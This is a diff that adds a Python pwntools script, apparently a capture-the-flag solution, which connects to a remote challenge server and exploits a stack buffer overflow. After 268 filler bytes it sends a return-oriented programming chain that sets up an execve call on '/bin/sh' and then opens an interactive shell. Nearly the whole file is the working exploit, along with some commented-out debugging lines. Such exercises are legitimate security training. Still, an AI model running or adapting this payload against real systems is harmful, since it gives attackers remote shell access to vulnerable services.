@@ -1,0 +1,45 @@
+from pwn import *
+
+system_address = p64(0x000000000040117d)
+bin_sh = p64(0x00404048)
+rdi = p64(0x00000000004013a3)
+rsi_r15 = p64(0x00000000004013a1)
+null_val = p64(0x0)
+rax = p64(0x0000000000401180)
+
+p = remote("challenge.scy-phy.net", 2013)
+
+first_input = b"A" * 50
+p.sendline(first_input)
+p.recvline()
+sleep(1)
+
+middle_input = b"B" * 200
+p.sendline(middle_input)
+p.recvline()
+
+#try_input = b"B" * 100
+#p.sendline(try_input)
+
+#input = b"B" * 100
+#p.sendline(input)
+
+second_input = b"B" * 268
+second_input += rdi
+second_input += bin_sh
+#second_input += null_val
+#second_input += ret
+second_input += rax
+second_input += p64(59)
+second_input += null_val
+second_input += rsi_r15
+second_input += null_val
+second_input += null_val
+#second_input += null_val
+second_input += system_address
+#print(second_input)
+p.sendline(second_input)
+p.recvline()
+#gdb.attach(p)
+#sleep(1)
+p.interactive()
